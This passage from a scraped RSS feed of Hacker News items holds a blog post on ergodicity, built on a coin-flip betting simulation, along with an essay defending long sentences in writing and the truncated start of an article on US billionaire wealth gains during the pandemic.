<figure id="attachment_2272" aria-describedby="caption-attachment-2272"><img data-attachment-id="2272" data-permalink="https://neurabites.com/ergodicity/coinflip5/" data-orig-file="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?fit=838%2C560&amp;ssl=1" data-orig-size="838,560" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coinflip5" data-image-description="" data-medium-file="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?fit=300%2C200&amp;ssl=1" data-large-file="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?fit=800%2C535&amp;ssl=1" loading="lazy" src="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?resize=500%2C334&amp;ssl=1" alt="" width="500" height="334" srcset="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?w=838&amp;ssl=1 838w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?resize=768%2C513&amp;ssl=1 768w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?resize=272%2C182&amp;ssl=1 272w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?w=838&amp;ssl=1 838w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?resize=768%2C513&amp;ssl=1 768w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?resize=272%2C182&amp;ssl=1 272w" data-lazy-src="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip5.png?resize=500%2C334&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption id="caption-attachment-2272"><a href="https://ergodicityeconomics.com/lecture-notes/" target="_blank" rel="noopener noreferrer">Ergodicity Economics Lecture Notes, Ole Peters</a></figcaption></figure>
<p>Remember they never go completely bust – since a loss is 40% of their current wealth. Now, the downward trend is rather apparent.</p>
<p>Back to our first graph.</p>
<figure id="attachment_1941" aria-describedby="caption-attachment-1941"><img data-attachment-id="1941" data-permalink="https://neurabites.com/ergodicity/coinflip1/" data-orig-file="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?fit=1045%2C728&amp;ssl=1" data-orig-size="1045,728" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coinflip1" data-image-description="" data-medium-file="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?fit=300%2C209&amp;ssl=1" data-large-file="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?fit=800%2C557&amp;ssl=1" loading="lazy" src="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=500%2C348&amp;ssl=1" alt="" width="500" height="348" srcset="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=1024%2C713&amp;ssl=1 1024w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=300%2C209&amp;ssl=1 300w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=768%2C535&amp;ssl=1 768w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=861%2C600&amp;ssl=1 861w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=960%2C669&amp;ssl=1 960w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?w=1045&amp;ssl=1 1045w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=1024%2C713&amp;ssl=1 1024w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=300%2C209&amp;ssl=1 300w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=768%2C535&amp;ssl=1 768w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=861%2C600&amp;ssl=1 861w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=960%2C669&amp;ssl=1 960w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?w=1045&amp;ssl=1 1045w" data-lazy-src="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=500%2C348&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption id="caption-attachment-1941"><a href="https://ergodicityeconomics.com/lecture-notes/" target="_blank" rel="noopener noreferrer">Ergodicity Economics Lecture Notes, Ole Peters</a></figcaption></figure>
<p>This was a simulation for 1 individual over 50 rounds.</p>
<p>Now, let’s run simulations for 100 individuals playing concurrently over 50 rounds, and show the average results (wealth) at each point in time in one image.</p>
<figure id="attachment_1942" aria-describedby="caption-attachment-1942"><img data-attachment-id="1942" data-permalink="https://neurabites.com/ergodicity/coinflip2/" data-orig-file="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?fit=841%2C568&amp;ssl=1" data-orig-size="841,568" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coinflip2" data-image-description="" data-medium-file="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?fit=300%2C203&amp;ssl=1" data-large-file="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?fit=800%2C540&amp;ssl=1" loading="lazy" src="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?resize=500%2C338&amp;ssl=1" alt="" width="500" height="338" srcset="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?w=841&amp;ssl=1 841w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?resize=300%2C203&amp;ssl=1 300w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?resize=768%2C519&amp;ssl=1 768w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?w=841&amp;ssl=1 841w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?resize=300%2C203&amp;ssl=1 300w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?resize=768%2C519&amp;ssl=1 768w" data-lazy-src="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip2.png?resize=500%2C338&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption id="caption-attachment-1942"><a href="https://ergodicityeconomics.com/lecture-notes/" target="_blank" rel="noopener noreferrer">Ergodicity Economics Lecture Notes, Ole Peters</a></figcaption></figure>
<p>The green line shows the <strong>average</strong> y-values (wealth) for 100 players at each x-value (time). Again, no clear trend.</p>
<p>Simulate for 10,000 players (red line) and we start to see a trend. On average, this group of 10,000 players is sitting on a nice ~10x profit.</p>
<p>Simulate a million concurrent players, and the trend is more apparent.&nbsp;</p>
<p>Again, a logarithmic axis shows this more clearly.</p>
<figure id="attachment_1943" aria-describedby="caption-attachment-1943"><img data-attachment-id="1943" data-permalink="https://neurabites.com/ergodicity/coinflip3/" data-orig-file="https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?fit=827%2C561&amp;ssl=1" data-orig-size="827,561" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coinflip3" data-image-description="" data-medium-file="https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?fit=300%2C204&amp;ssl=1" data-large-file="https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?fit=800%2C543&amp;ssl=1" loading="lazy" src="https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?resize=500%2C339&amp;ssl=1" alt="" width="500" height="339" srcset="https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?w=827&amp;ssl=1 827w, https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?resize=300%2C204&amp;ssl=1 300w, https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?resize=768%2C521&amp;ssl=1 768w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?w=827&amp;ssl=1 827w, https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?resize=300%2C204&amp;ssl=1 300w, https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?resize=768%2C521&amp;ssl=1 768w" data-lazy-src="https://i2.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip3.png?resize=500%2C339&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption id="caption-attachment-1943"><a href="https://ergodicityeconomics.com/lecture-notes/" target="_blank" rel="noopener noreferrer">Ergodicity Economics Lecture Notes, Ole Peters</a></figcaption></figure>
<p>The average wealth of a million people increases exponentially as they play this game. <span>(Recall from all the March COVID-19 graphs that a linear increase on logarithmic axis means exponential growth. It’s a neat trick to distinguish exponential growth from mere very fast growth.)</span></p>
<p>This trend persists as we extend time to 1,000 rounds and so on.&nbsp;</p>

<p>But wait. This doesn’t make sense.</p>
<p>Earlier, we showed that for an <strong>individual</strong> player, wealth trends to <strong>zero&nbsp;</strong>over time.</p>
<p>But for the <strong>aggregate</strong> of individuals, wealth trends <strong>exponentially upwards</strong> over time.</p>
<p>How can many things that trend to zero sum up to exponential growth?</p>
<p>Answer: <strong>there’s a few really lucky bastards that distort the average.</strong></p>
<p>A more technical answer: <strong>ergodicity</strong>. Or more specifically, a false assumption of ergodicity for this non-ergodic game.</p>

<p>Let’s take a deeper dive and explore some scenarios for an individual starting with $100.</p>
<p><strong>Round 1</strong>: 2 scenarios</p>
<ul>
<li><span>H: $100 x 1.5 = $150 (up $50)</span></li>
<li><span>T: $100 x 0.6 = $60 (down $40)</span></li>
<li><span>Outcomes: 1 up, 1 down <strong><span>50% of outcomes are up.</span></strong></span></li>
<li><span>Average after 1 round: <strong><span>$105</span></strong></span></li>
</ul>
<p><strong>Round 2</strong>: 4 scenarios</p>
<ul>
<li><span>HH: $100 x 1.5 x 1.5 = $225 (up $125)</span></li>
<li><span>HT: $100 x 1.5 x 0.6 = $90 (down $10)</span></li>
<li><span>TH: $100 x 0.6 x 1.5 = $90 (down $10)</span></li>
<li><span>TT: $100 x 0.6 x 0.6 = $36 (down $64)</span></li>
<li><span>Outcomes: 1 up, 3 down. <strong><span>25% of outcomes are up.</span></strong></span></li>
<li><span>Average after 2 rounds: <span><strong>$110.3</strong></span></span></li>
</ul>
<p><strong>Round 3</strong>: 8 scenarios</p>
<ul>
<li><span>HHH: $100 x 1.5 x 1.5 x 1.5&nbsp; = $337.5 (up $237.5)</span></li>
<li><span>HTH: $100 x 1.5 x 0.6 x 1.5 = $135 (up $35)</span></li>
<li><span>THH: $100 x 0.6 x 1.5 x 1.5 = $135 (up $35)</span></li>
<li><span>TTH: $100 x 0.6 x 0.6 x 1.5 = $54 (down $66)</span></li>
<li><span>HHT: $100 x 1.5 x 1.5 x 0.6 = $135 (up $35)</span></li>
<li><span>HTT: $100 x 1.5 x 0.6 x 0.6 = $54 (down $66)</span></li>
<li><span>THT: $100 x 0.6 x 1.5 x 0.6 = $54 (down $66)</span></li>
<li><span>TTT: $100 x 0.6 x 0.6 x 0.6 = $21.6 (down $78.4)</span></li>
<li><span>Outcomes: 4 up, 4 down.</span> <strong><span>50% of outcomes are up.</span></strong></li>
<li><span>Average after 3 rounds:</span> <span><strong>$115.8</strong></span></li>
</ul>
<p>Similarly, we repeat this logic for even more rounds with the help of binomial probability distributions in Excel.</p>
<p><strong>Round 10</strong>: 1,024 scenarios</p>
<ul>
<li><span>H 10 times: $100 x 1.5<sup>10 </sup>= $5,767</span></li>
<li><span>H 5 times, T 5 times (order doesn’t matter here): $100 x 1.5<sup>5 </sup>x 0.6<sup>5 </sup>= $59</span></li>
<li><span>T 10 times: $100 x 0.6<sup>10 </sup>= $0.6</span></li>
<li><span>Outcomes: 386 up, 638 down. <strong><span>38% of outcomes are up..</span></strong></span></li>
<li><span>Average after 10 rounds: <strong><span>$163</span> <span>($100 x 1.05<sup>10</sup>).</span></strong></span></li>
</ul>
<p><strong>Round 100</strong>: 2<sup>100 </sup>scenarios</p>
<ul>
<li><span>H 100 times: $100 x 1.5<sup>100 </sup>= $4.1 x 10<sup>19</sup></span></li>
<li><span>H 50 times, T 50 times (order doesn’t matter here): $100 x 1.5<sup>50 </sup>x 0.6<sup>5 </sup>= $0.5</span></li>
<li><span>T 100 times: $100 x 0.6<sup>100 </sup>= $6.5 x 10<sup>-21</sup></span></li>
<li><span>Outcomes: 1.7 x 10<sup>29 </sup>up, 1.1 x 10<sup>30 </sup>down. <strong><span>14% of outcomes are up.</span></strong></span></li>
<li><span>Average after 100 rounds: <strong><span>$13,150 ($100 x 1.05<sup>100</sup>)</span></strong></span></li>
</ul>
<p>Some observations.</p>
<p>(i) In aggregate, payout is favourable to the players since average wealth is consistently above starting value of $100. This is the ensemble-average.</p>
<p>(ii) But this asymmetric payoff is only favourable on the <strong>ensemble dimension</strong> (taking the aggregate and dividing it by number of players). The pay-off structure is not favourable to an individual on the <strong>temporal </strong>(time) <strong>dimension</strong>. On an individual level, people are actually more likely to lose the longer they play. Gambler’s ruin. Thus, looking at ensemble returns is a poor indicator of individual returns.</p>
<p>So as the game goes on: the house loses money as they’re paying out more than they receive, while more people become losers, and just a lucky few get obscenely rich. <span>(For context, the winnings from 100 consecutive heads, $4.1 x 10<sup>19</sup> is taking the global GDP of ~$100t and multiplying it by 400k years. So all of the wealth we’re creating today multiplied by longer than Homo sapiens’ existence. The probability of 1 in 2<sup>100 </sup>is even more ludicrous.)</span></p>
<p>There’s many variations to the example we explored: e.g. a triple-or-nothing coin flip. We get similar results except instead of decaying to zero, people go completely bust and end the game there, while some extremely lucky get fanatically rich.</p>

<p><span><b>1.3. Back to ergodicity</b></span></p>
<p>Recall:</p>
<blockquote>
<p>A process is said to be <strong>ergodic</strong>&nbsp;if the <strong>ensemble</strong>-average and <strong>time</strong>-average is <strong>equivalent</strong>.</p>
</blockquote>
<p>Clearly, simulating an individual playing 10,000 rounds gives a drastically different result to simulating 10,000 individuals playing 1 round.</p>
<p>The trajectory of an individual over a long time (time-average) gives a different result to the aggregate of many individual’s trajectories at an instant in time (ensemble-average, aka. space-average).<span>&nbsp;(Note: we can substitute ‘average’ in this statement with expectation value/outcome/probability/pay-off.)</span></p>
<p>What accounts for this difference is the <strong>path-dependent property of time</strong>. This distinction between the ensemble …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neurabites.com/ergodicity/">https://neurabites.com/ergodicity/</a></em></p>]]>
            </description>
            <link>https://neurabites.com/ergodicity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25966194</guid>
            <pubDate>Sat, 30 Jan 2021 04:48:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[“Write short sentences” is bad advice]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25966103">thread link</a>) | @thesephist
<br/>
January 29, 2021 | https://thesephist.com/posts/long-sentences/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/long-sentences/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>A common writing advice is to keep your sentences short and simple. The argument goes that writing is better when it is concise, because you’re more efficiently communicating your ideas. Long sentences take more energy for the reader to process, and you shouldn’t require that of the reader if it’s not necessary. That seems to be the logic.</p>
<p>This is bad advice.</p>
<p>Sentence length and rhythm are linguistic tools at the disposal of a writer just like word choice and grammar. Short sentences are useful for certain things, and long sentences are useful for other things. To tell a writer to only use short sentences because long sentences are hard to understand is patronizing to both the writer, whose ability to compose good sentences you have just insulted, and the reader, whose reading ability you have also underestimated.</p>
<p>If you keep your sentence lengths short all the time, and your sentence structures minimal all the time, you don’t get good prose, you get a nursery rhyme. Something with such monotonic and one-track rhythm that it becomes tedious to read.</p>
<p>Imagine if I only wrote the shortest sentences I could. I cut out all my asides. I remove redundant words. I keep my ideas concise. It gets boring to read. My ideas no longer connect from one sentence to another. They can’t congeal in the mind. Reading writing like this feels disjointed and stuttery. You eventually focus too much on the broken rhythm. How are we to communicate eloquently like this? It’s madness.</p>
<p>Instead, consider this:</p>
<p>Short sentences are sometimes useful. They’re useful for making a sharp point, like a fast cut in a film synchronized to the sudden <em>pang</em> of a gunshot. They’re also useful for stating a claim: <em>long sentences are fine.</em> But many times, you write for a purpose greater than to simply transplant a logical assertion from your brain to the brain of another human. Like a single cut in a film that follows a character sprinting across a burning battlefield with bombs raining down, long sentences stretch out time and build tension through the words. Composers, who think deeply about the importance of variety in phrasing, know the importance of this variation intimately.</p>
<p>Sometimes what you want is indeed a sharp, pointed sentence.</p>
<blockquote>
<p>Keep your sentences short. Make simple points. Hold the reader’s attention. Don’t make them think harder to understand what you mean.</p>
</blockquote>
<p>But many times, the meaning isn’t in the words we use but how we say it.</p>
<blockquote>
<p>If you trust in the reader, if you trust in the strength of your idea spoken through your words to hold their hands steadily and firmly through your maze of ideas bubbling through, you might occasionally take the leap of faith to build tension and anticipation through a longer sentence – perhaps one just like this – to build to a great release at the end. A breath of relief; a point made.</p>
</blockquote>
<p>Telling writers to write short, concise sentences is like telling a director to keep their cuts 2-4 seconds in length for  whole movie, or telling a composer to only use 2-measure phrases for an entire song. It’s nonsense that covers up the true problem with long sentences: writing well-constructed long sentences is a skill to be practiced. The solution isn’t to ban long sentences, but to learn how to construct them artfully.</p>
<p>The correct advice <em>should</em> be, “write sentences that are easy to understand.” This is different than “don’t write long sentences.”</p>
<p>Write long sentences, if you must. Write short sentences, if they are fit to serve. Write whatever the hell kind of sentence you want. I don’t care. But whatever you do, write sentences that carry the full weight of your meaning, where you don’t have to chop up your ideas to fit short sentences or stretch out your ideas to cover long ones.</p>
<p>Writing is more than what you say, it’s also how you say it. Sentence length and rhythm are just two other tools in the toolbox of the writer, and we should learn to use them well rather than shy away from their sharp edges.</p>

        <hr>
        <p>
            
            ←
            <a href="https://thesephist.com/posts/ideaflow/"><em>I'm joining Ideaflow to build a universe of better tools for ideas</em></a>
            
        </p>
        
        <p>
            I share new posts on my <a href="https://thesephist.com/#newsletter">newsletter.</a>
            If you liked this one, you should consider joining the list.
        </p>
        <p>Have a comment or response? You can <a href="https://thesephist.com/#get-in-touch">email me.</a></p>
    </article></div>]]>
            </description>
            <link>https://thesephist.com/posts/long-sentences/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25966103</guid>
            <pubDate>Sat, 30 Jan 2021 04:35:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Still using a cloth mask? Upgrade to an N95 or P100]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25965547">thread link</a>) | @apsec112
<br/>
January 29, 2021 | https://www.microcovid.org/blog/masks | <a href="https://web.archive.org/web/*/https://www.microcovid.org/blog/masks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.microcovid.org/blog/masks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25965547</guid>
            <pubDate>Sat, 30 Jan 2021 02:52:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Billionaires Gone Wild: Pandemic Profiteering by the Numbers]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25965259">thread link</a>) | @jimmy2020
<br/>
January 29, 2021 | https://scheerpost.com/2021/01/27/billionaires-gone-wild-pandemic-profiteering-by-the-numbers/ | <a href="https://web.archive.org/web/*/https://scheerpost.com/2021/01/27/billionaires-gone-wild-pandemic-profiteering-by-the-numbers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
		A running tally of how the pandemic has been increasing inequity at a fantastic rate.	</p><div>
		
<p><strong>By Chuck Collins</strong> /<a href="https://inequality.org/great-divide/updates-billionaire-pandemic/"> Inequality.org</a></p>



<p>The collective wealth of all U.S. billionaires has increased over $1.1 trillion since mid-March 2020, a nearly 40% leap during the past 10 months of national emergency. This wealth windfall could pay for all the relief for working families contained in the&nbsp;<a rel="noreferrer noopener" href="https://www.wsj.com/articles/biden-to-propose-1-9-trillion-covid-19-package-11610661977" target="_blank">$1.9 trillion coronavirus relief package</a>&nbsp;proposed by President Biden, while leaving the nation’s richest households no worse off than they were before COVID-19 hit.</p>



<p>The combined fortune of the nation’s 660 billionaires as of Monday, January 18, 2021 was $4.1 trillion, up 38.6% from their collective net worth of just under $3 trillion on March 18, 2020, the rough start of the pandemic, based on&nbsp;<em>Forbes</em>&nbsp;data compiled in&nbsp;<a href="https://docs.google.com/spreadsheets/d/1LGeUxuE-Z2OyNKu54JQIffS1v588iUvV6yd6D2vH6Vc/edit?usp=sharing" target="_blank" rel="noreferrer noopener">this report&nbsp;</a>by the Americans for Tax Fairness (ATF) and the Institute for Policy Studies (IPS). There have been 46 newly minted billionaires since the beginning of the pandemic, when&nbsp;<a href="https://americansfortaxfairness.org/issue/tale-two-crises-billionaires-gain-workers-feel-pandemic-pain/" target="_blank" rel="noreferrer noopener">there were 614</a>.</p>



<p>At $4.1 trillion, the total wealth of America’s 660 billionaires is two-thirds higher than the&nbsp;<a href="https://www.federalreserve.gov/releases/z1/dataviz/dfa/distribute/chart/" target="_blank" rel="noreferrer noopener">$2.4 trillion in total wealth</a>&nbsp;held by the bottom half of the population,&nbsp;<a href="https://www.census.gov/popclock/embed.php?component=counter" target="_blank" rel="noreferrer noopener">165 million Americans</a>.</p>



<p>March 18 is used as the unofficial beginning of the pandemic because by then most<a href="https://www.cnn.com/2020/03/13/politics/states-coronavirus-fema/index.html" target="_blank" rel="noreferrer noopener">&nbsp;federal</a>&nbsp;and<a href="https://www.foxnews.com/us/what-states-have-declared-coronavirus-emergencies" target="_blank" rel="noreferrer noopener">&nbsp;state</a>&nbsp;economic restrictions responding to the virus were in place. Moreover, March 18 was also the publication date of Forbes’ annual billionaires report in 2020. It provided a detailed baseline that ATF and IPS have been comparing periodically with real-time data from the&nbsp;<em>Forbes</em>&nbsp;website. This methodology has been&nbsp;<a href="https://www.politifact.com/factchecks/2020/oct/12/joe-biden/biden-says-billionaires-gained-800-billion-study-l/" target="_blank" rel="noreferrer noopener">favorably reviewed by PolitiFact</a>.</p>



<p><strong>The $1.1 trillion wealth gain by 660 U.S. billionaires since March 2020 could pay for:</strong></p>



<ul><li>All of the relief for working families contained in President Biden’s proposed $1.9 trillion pandemic rescue package, which includes $1,400 in direct payments to individuals, $400-a-week supplements to unemployment benefits, and an expanded child tax credit. (See table below)</li><li>A stimulus check of more than $3,400 for every one of the roughly&nbsp;<a rel="noreferrer noopener" href="https://www.census.gov/popclock/embed.php?component=counter" target="_blank">331 million people in the United States</a>. A family of four would receive over $13,000.&nbsp;<a rel="noreferrer noopener" href="https://thehill.com/homenews/senate/530913-gop-senator-blocks-bill-for-12k-stimulus-checks-for-second-time" target="_blank">Republicans in Congress resisted</a>&nbsp;sending families stimulus checks most of last year, claiming we couldn’t afford them.</li></ul>



<figure><img data-attachment-id="6999" data-permalink="https://scheerpost.com/2021/01/27/billionaires-gone-wild-pandemic-profiteering-by-the-numbers/biden-covid-relief-table-jan-2021-768x615/" data-orig-file="https://i1.wp.com/scheerpost.com/wp-content/uploads/2021/01/Biden-Covid-Relief-Table-Jan.2021-768x615-1.png?fit=768%2C615&amp;ssl=1" data-orig-size="768,615" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Biden-Covid-Relief-Table-Jan.2021-768×615" data-image-description="" data-medium-file="https://i1.wp.com/scheerpost.com/wp-content/uploads/2021/01/Biden-Covid-Relief-Table-Jan.2021-768x615-1.png?fit=300%2C240&amp;ssl=1" data-large-file="https://i1.wp.com/scheerpost.com/wp-content/uploads/2021/01/Biden-Covid-Relief-Table-Jan.2021-768x615-1.png?fit=768%2C615&amp;ssl=1" loading="lazy" width="768" height="615" src="https://i1.wp.com/scheerpost.com/wp-content/uploads/2021/01/Biden-Covid-Relief-Table-Jan.2021-768x615-1.png?resize=768%2C615&amp;is-pending-load=1#038;ssl=1" alt="" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/scheerpost.com/wp-content/uploads/2021/01/Biden-Covid-Relief-Table-Jan.2021-768x615-1.png?w=768&amp;ssl=1 768w, https://i1.wp.com/scheerpost.com/wp-content/uploads/2021/01/Biden-Covid-Relief-Table-Jan.2021-768x615-1.png?resize=300%2C240&amp;ssl=1 300w" data-lazy-sizes="(max-width: 768px) 100vw, 768px" data-lazy-src="https://i1.wp.com/scheerpost.com/wp-content/uploads/2021/01/Biden-Covid-Relief-Table-Jan.2021-768x615-1.png?resize=768%2C615&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Source: Moody’s Analytics, “<a rel="noreferrer noopener" href="https://www.moodysanalytics.com/-/media/article/2021/economic-assessment-of-biden-fiscal-rescue-package.pdf" target="_blank">The Biden Fiscal Rescue Package</a>,” Jan. 15, 2021</figcaption></figure>



<hr>



<figure><img data-attachment-id="7001" data-permalink="https://scheerpost.com/2021/01/27/billionaires-gone-wild-pandemic-profiteering-by-the-numbers/billionaires-table-jan-2021-768x444/" data-orig-file="https://i0.wp.com/scheerpost.com/wp-content/uploads/2021/01/Billionaires-table-Jan.2021-768x444-1.png?fit=768%2C444&amp;ssl=1" data-orig-size="768,444" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Billionaires-table-Jan.2021-768×444" data-image-description="" data-medium-file="https://i0.wp.com/scheerpost.com/wp-content/uploads/2021/01/Billionaires-table-Jan.2021-768x444-1.png?fit=300%2C173&amp;ssl=1" 